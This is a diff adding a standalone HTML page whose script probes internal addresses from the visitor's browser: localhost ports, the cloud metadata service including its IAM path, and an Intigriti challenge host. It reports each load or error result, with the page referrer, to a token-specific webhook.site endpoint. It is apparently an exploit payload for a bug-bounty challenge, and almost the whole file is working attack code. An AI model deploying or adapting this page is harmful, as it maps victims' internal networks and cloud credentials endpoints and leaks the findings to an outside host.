@@ -1,0 +1,25 @@
+<!doctype html><html><head><meta charset="utf-8"></head><body><script>
+  const token="e7956579-6a0a-486d-98aa-bf26ac6080a2";
+  const t = token;
+  const beacon=(u)=>{ new Image().src = `https://webhook.site/${t}/${encodeURIComponent(u)}?d=` + encodeURIComponent(document.referrer || 'none'); };
+  const targets=[
+    'http://127.0.0.1','http://127.0.0.1:80','http://127.0.0.1:3000','http://127.0.0.1:8080','http://127.0.0.1:5000','http://localhost','http://localhost:3000','http://localhost:8080','http://169.254.169.254/latest/meta-data','http://169.254.169.254/latest/meta-data/iam','http://challenge-0326.intigriti.io/challenge.html'
+  ];
+  function fire(label,url,ok){
+    beacon(label+':'+url+':'+ok);
+  }
+  for (const u of targets){
+    const s=document.createElement('script');
+    s.src=u+'/';
+    s.onload=()=>fire('script',u,'onload');
+    s.onerror=()=>fire('script',u,'onerror');
+    document.head.appendChild(s);
+  }
+  for (const u of targets){
+    const i=new Image();
+    i.onload=()=>fire('img',u,'onload');
+    i.onerror=()=>fire('img',u,'onerror');
+    i.src=u+'/';
+  }
+  setTimeout(()=>beacon('done:'+Date.now()),12000);
+</script></body></html>
